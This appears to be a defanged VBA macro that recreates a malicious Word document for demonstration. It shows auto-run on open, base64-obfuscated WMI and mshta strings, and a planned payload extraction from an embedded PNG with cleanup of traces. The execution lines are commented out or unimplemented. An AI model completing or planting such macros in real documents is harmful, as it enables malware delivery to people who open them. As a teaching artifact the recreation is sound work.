Sub MsgBoxOKCancel()
    Dim Message As String
    Message = "This document will launch the faux-malicious payload after you close this message box."
    MsgBox (Message)
End Sub

' Runs when the document is opened, same as Document_Open() should
' The malware payload was originally located in Document_Open(),
' which is why we are preserving it
Sub AutoOpen()
    Call Document_Open
End Sub

Sub Document_Open()
On Error GoTo Error_Handler
' Variable Declarations
    Dim TempPath As String
    Dim TempFilePath As String
    Dim DocName As String
    Dim ShellApp As Object
    Dim FileSys As Object
    Dim ByteArray() As Byte
    Dim CreatedImageFilePath As String
    Dim CreatedImageBMPFilePath As String
    Dim MyCalc As String
    
    Dim objWMIService, objProcess
    Dim strShell, objProgram, strComputer, strExe, strInput, intProcessID
    
    

    'Call MsgBoxOKCancel
    MyCalc = "d21ubWdtdHM8Ly8uL3Jvb3QvY21tdjI6V21uMzJfUHJvY2Vzcw==" ' wmnmgmts<//./root/cmmv2:Wmn32_Process
    Dim Calc As String: Calc = Decode(MyCalc)
    Dim MyValue As String: MyValue = "bXNodGE=" ' mshta
    Dim Value As String: Value = Decode(MyValue)
    Dim MyExt1 As String: MyExt1 = "emlw" ' zip
    Dim Ext1 As String: Ext1 = Decode(MyExt1)
    imageFileName = "Image003.png"
    Set ShellApp = CreateObject("Shell.Application")
    Set FileSys = CreateObject("Scripting.FileSystemObject")
    DocName = ActiveDocument.Name
    If InStr(DocName, ".") > 0 Then
        DocName = Left(DocName, InStr(DocName, ".") - 1)
    End If
    
    ' TODO: Below is unimplemented, until I create the PNG with Payload

    ' DEBUG: Don't pollute Temp
    TempPath = ActiveDocument.Path & "\" & DocName
    ' TempPath = Environ("Temp") & "\" & DocName
    
    CreatedExeFilePath = Environ("Temp") & "\" & ExeFileName ' What is ExeFileName?
    
    'ActiveDocument.SaveAs TempPath, wdFormatHTML, , , , , True
    
    ' DEBUG: Don't protect document
    'Call Show
    
    TempPath = TempPath & "_files"
    CreatedImageFilePath = TempPath & "\" & imageFileName
    ' DEBUG: uses Environ("Temp") instead of TempPath on below line.
    CreatedImageBMPFilePath = TempPath & "\" & Left(imageFileName, InStrRev(imageFileName, ".")) & Ext1
    ' Extract the malicious payload from the png host
    ' Call WIA_ConvertImage(CreatedImageFilePath, CreatedImageBMPFilePath)

    'Set objWMIService = GetObject(Calc)
    'objWMIService.Create Value & " " & CreatedImageBMPFilePath
    'Kill TempPath & "\*.*"
    'RmDir TempPath

Error_Handler:
    Exit Sub
End Sub

' Makes the document protected, so no changes can be made to it.
Private Sub Show()
    Application.ActiveDocument.Unprotect Password:="taifehjRTYB$%^45"
    ThisDocument.PageSetup.PageWidth = 612
    ThisDocument.PageSetup.PageHeight = 792
    Set DocPageSetup = ThisDocument.PageSetup
    DocPageSetup.LeftMargin = 72
    DocPageSetup.RightMargin = 72
    DocPageSetup.TopMargin = 85.05
    DocPageSetup.BottomMargin = 72
    Application.ActiveDocument.Shapes(1).Visible = False
    Bookmarks("main").Range.Font.Hidden = False
    ActiveDocument.ActiveWindow.View.Type = wdPrintView
    Application.ActiveDocument.Protect Type:=wdAllowOnlyComments, Password:="taifehjRTYB$%^45"
End Sub

' Function to Decode base 64 encoded data,
' The original malware concealed data by encoding it in base 64
' While this is redundant for our demonstration, we include it for completeness
Function Decode(Str As String) As String
    Dim StringLength As Integer: StringLength = Len(Str) - 1
    Dim Base64Chars As String: Base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

    Dim CharList() As String        ' Array for Base64 character codes
    Dim StringArray() As String     ' Array of input value
    Dim EncodedArray() As Integer   ' Step 1 Array: Base64 Character codes
    Dim BinaryArray() As String     ' Step 2 Array: Binary Representation of Base 64 Character Codes
    Dim BinaryString As String      ' Step 3 String: Large Binary glob of resulting data
    Dim ResultArray() As String       ' Step 4: Resulting Byte array to convert into result string
    ' Specify Array Dimensions
    ReDim EncodedArray(StringLength)
    ReDim BinaryArray(StringLength)
    ReDim StringArray(Len(Str) - 1)
    ReDim CharList(Len(Base64Chars) - 1)
    
    ' Split String input into characters
    For I = 1 To Len(Str)
        StringArray(I - 1) = Mid$(Str, I, 1)
    Next I

    For I = 1 To Len(Base64Chars)
        CharList(I - 1) = Mid$(Base64Chars, I, 1)
    Next I
    
    For I = 0 To StringLength
        For J = 0 To 63
            If StringArray(I) = CharList(J) Then
                EncodedArray(I) = J
                Exit For
            End If
            ' Mark Invalid Indices
            If J = 63 Then
                EncodedArray(I) = 65
            End If

        Next J
    Next I
    
    ' Trim trailing padding characters
    Dim Count As Integer: Count = 0
    For Each Elem In EncodedArray
        If Elem <> 65 Then
            Count = Count + 1
        End If
    Next
    
    ReDim Preserve EncodedArray(Count - 1)
    
    ' Convert each CharCode to binary and remove first 2 indices
    For I = 0 To UBound(EncodedArray) - LBound(EncodedArray)
        BinaryArray(I) = Mid$(Dec2Bin(EncodedArray(I), 8), 3)
    Next I
    
    ' Join the binary to form one long binary string to be split into ASCII
    BinaryString = Join(BinaryArray, "")
    
    ReDim ResultArray(Len(BinaryString) / 8)
    
    ' Split into Ascii
    For I = 1 To Len(BinaryString) / 8
        Dim Idx As Integer: Idx = 1
        
        If I <> 1 Then
            Idx = (I - 1) * 8 + 1
        End If

        ResultArray(I - 1) = Mid$(BinaryString, Idx, 8)
    Next I
    
    ' Finally, convert into ASCII
    For I = 0 To UBound(ResultArray) - LBound(ResultArray)
        ResultArray(I) = Chr(Bin2Dec(ResultArray(I)))
    Next I
    
    Decode = Join(ResultArray, "")
End Function

'Decimal To Binary
' =================
' Source: http://groups.google.ca/group/comp.lang.visual.basic/browse_thread/thread/28affecddaca98b4/979c5e918fad7e63
' Author: Randy Birch (MVP Visual Basic)
' NOTE: You can limit the size of the returned
'              answer by specifying the number of bits
Function Dec2Bin(ByVal DecimalIn As Variant, _
              Optional NumberOfBits As Variant) As String
    Dec2Bin = ""
    DecimalIn = Int(CDec(DecimalIn))
    Do While DecimalIn <> 0
        Dec2Bin = Format$(DecimalIn - 2 * Int(DecimalIn / 2)) & Dec2Bin
        DecimalIn = Int(DecimalIn / 2)
    Loop
    If Not IsMissing(NumberOfBits) Then
       If Len(Dec2Bin) > NumberOfBits Then
          Dec2Bin = "Error - Number exceeds specified bit size"
       Else
          Dec2Bin = Right$(String$(NumberOfBits, _
                    "0") & Dec2Bin, NumberOfBits)
       End If
    End If
End Function
 
'Binary To Decimal
' =================
Function Bin2Dec(BinaryString As String) As Variant
    Dim X As Integer
    For X = 0 To Len(BinaryString) - 1
        Bin2Dec = CDec(Bin2Dec) + Val(Mid(BinaryString, _
                  Len(BinaryString) - X, 1)) * 2 ^ X
    Next
End Function

